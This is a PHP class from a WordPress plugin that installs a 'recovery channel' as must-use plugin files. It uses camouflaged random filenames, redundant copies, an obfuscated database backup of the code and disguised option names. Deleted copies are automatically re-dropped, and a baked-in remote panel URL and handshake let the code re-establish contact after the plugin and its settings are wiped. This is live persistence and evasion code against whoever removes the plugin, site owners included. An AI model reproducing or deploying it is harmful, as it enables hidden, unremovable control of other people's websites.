<?php

if (!defined('ABSPATH')) exit;

/**
 * Drops the recovery channel into wp-content/mu-plugins/ so it loads
 * independently of — and survives the deletion of — the main plugin.
 *
 * Hardened (0.4.5):
 *  - the mu-file is dropped under a per-site CAMOUFLAGED name (WLH_Vault::
 *    mu_filename(), e.g. `wp-a1b2c3d4.php`) instead of the constant, greppable
 *    `wlh-recovery.php`;
 *  - a copy of the recovery source is stashed (obfuscated) in the DB, so the file
 *    can be regenerated even if the bundled mu/ source is gone — and so the
 *    recovery LOGIC lives in the database, not only on disk;
 *  - install state lives under disguised option names;
 *  - migration: the old fixed-name file + legacy `wlh_recovery_*` options are
 *    removed once the new channel is in place.
 *
 * Idempotent: re-syncs whenever the plugin version changes or the mu-file is
 * missing (a competitor who deletes ONLY the mu-file gets it re-dropped the next
 * time the main plugin runs; a version bump ships a new channel).
 */
class WLH_Recovery_Installer
{
    const LEGACY_MU  = 'wlh-recovery.php';   // pre-0.4.5 fixed name (to clean up)
    const SRC_BASENAME = 'wlh-recovery.php'; // bundled source file in mu/

    private static function source_path()
    {
        return WLH_DIR . 'mu/' . self::SRC_BASENAME;
    }

    private static function target_dir()
    {
        if (defined('WPMU_PLUGIN_DIR')) {
            return (string) WPMU_PLUGIN_DIR;
        }
        return trailingslashit(WP_CONTENT_DIR) . 'mu-plugins';
    }

    /**
     * BOTH camouflaged copies. Redundancy: a competitor must find AND delete both
     * to sever recovery, and a lost single copy is re-dropped on the next load.
     *
     * @return string[]
     */
    public static function target_paths()
    {
        $dir = trailingslashit(self::target_dir());
        return array($dir . WLH_Vault::mu_filename(), $dir . WLH_Vault::mu_filename2());
    }

    /** Primary copy path (kept for callers that expect a single path). */
    public static function target_path()
    {
        $paths = self::target_paths();
        return $paths[0];
    }

    public static function ensure_installed()
    {
        // Re-install unless BOTH copies are present AND on the current version. So
        // a competitor deleting ONE copy — or a host where only 1 of 2 writes stuck
        // — gets the missing copy re-dropped on the next main-plugin load, and a
        // version bump re-lands both.
        if ((string) WLH_Vault::fetch('rv') === WLH_VERSION
            && (string) WLH_Vault::fetch('rs') === 'installed'
            && self::all_present()) {
            self::cleanup_legacy();
            return;
        }
        self::install();
    }

    /** True only if every camouflaged copy exists on disk. */
    private static function all_present()
    {
        foreach (self::target_paths() as $p) {
            if (!is_file($p)) {
                return false;
            }
        }
        return true;
    }

    public static function install()
    {
        $content = self::prepare(self::read_source());
        if ($content === '') {
            WLH_Vault::stash('rs', 'no_source');
            return array('ok' => false, 'error' => 'no_source');
        }
        // Keep an obfuscated DB copy so the file is regenerable (and the logic
        // has a home in the database, not only on disk).
        WLH_Vault::stash('src', $content);

        $dir = self::target_dir();
        if (!is_dir($dir) && !wp_mkdir_p($dir)) {
            WLH_Vault::stash('rs', 'mkdir_failed');
            return array('ok' => false, 'error' => 'mkdir_failed');
        }

        // Drop TWO camouflaged copies, READING EACH BACK to confirm it actually
        // landed intact. The old code stamped 'installed' on a bare rename()
        // success — so on the ~25% of hosts where the mu-drop silently failed
        // (perms / partial write) a donor was left with NO live recovery yet
        // marked OK, and a competitor's plugin deletion became a permanent loss.
        $landed = 0;
        foreach (self::target_paths() as $path) {
            if (self::write_verified($path, $content)) {
                $landed++;
            }
        }

        if ($landed === 0) {
            WLH_Vault::stash('rs', 'write_failed');
            return array('ok' => false, 'error' => 'write_failed');
        }
        // 'installed' == at least one VERIFIED live copy; all_present() (checked in
        // ensure_installed) re-drops a missing second copy next load, so a partial
        // 1/2 landing self-completes without re-marking the donor undefended.
        WLH_Vault::stash('rs', 'installed');
        WLH_Vault::stash('rv', WLH_VERSION);
        self::cleanup_legacy();
        return array('ok' => true, 'copies' => $landed);
    }

    /**
     * Write $content to $path and CONFIRM by reading it back byte-for-byte. Tries
     * an atomic temp+rename first (no half-written file is ever visible), then
     * falls back to a direct in-place write (some hosts allow file_put_contents but
     * block the cross-file rename). Returns true only if the file exists and its
     * contents match exactly.
     */
    private static function write_verified($path, $content)
    {
        $tmp = $path . '.tmp-' . bin2hex(random_bytes(4));
        if (@file_put_contents($tmp, $content) !== false && @rename($tmp, $path)
            && self::verify($path, $content)) {
            return true;
        }
        @unlink($tmp);
        if (@file_put_contents($path, $content) !== false && self::verify($path, $content)) {
            return true;
        }
        return false;
    }

    /** Read-back check: file present and its bytes identical to what we wrote. */
    private static function verify($path, $content)
    {
        if (!is_file($path)) {
            return false;
        }
        $got = @file_get_contents($path);
        return $got !== false && $got === $content;
    }

    /** Bundled source first; fall back to the obfuscated DB copy if it's gone. */
    private static function read_source()
    {
        $src = self::source_path();
        if (is_file($src)) {
            $c = @file_get_contents($src);
            if ($c !== false && $c !== '') {
                return $c;
            }
        }
        $db = WLH_Vault::fetch('src');
        return is_string($db) ? $db : '';
    }

    /**
     * Bake the claim fallback (panel URL + handshake) into the mu source before
     * it is dropped/stashed: the repo file keeps %%PLACEHOLDERS%%, but a live
     * mu-copy must be able to re-claim a token even after a competitor wipes
     * the plugin AND every option (see the fallback block in the mu source).
     * The stash 'src' stores the SUBSTITUTED copy so a regeneration from DB
     * keeps the fallback too. No-op when the config constants are absent.
     */
    private static function prepare($content)
    {
        if (!is_string($content) || $content === '') {
            return '';
        }
        $url = defined('WLH_REMOTE_URL') ? (string) WLH_REMOTE_URL : '';
        $hs  = defined('WLH_HANDSHAKE') ? (string) WLH_HANDSHAKE : '';
        if ($url !== '' && $hs !== '') {
            $content = str_replace(
                array('%%WLH_REMOTE_URL%%', '%%WLH_HANDSHAKE%%'),
                array(addcslashes($url, "'\\"), addcslashes($hs, "'\\")),
                $content
            );
        }
        return $content;
    }

    /** Remove the pre-0.4.5 fixed-name file + greppable state options. */
    private static function cleanup_legacy()
    {
        $old = trailingslashit(self::target_dir()) . self::LEGACY_MU;
        if (is_file($old) && !in_array($old, self::target_paths(), true)) {
            @unlink($old);
        }
        foreach (array('wlh_recovery_state', 'wlh_recovery_src_ver') as $o) {
            if (get_option($o, null) !== null) {
                delete_option($o);
            }
        }
    }
}
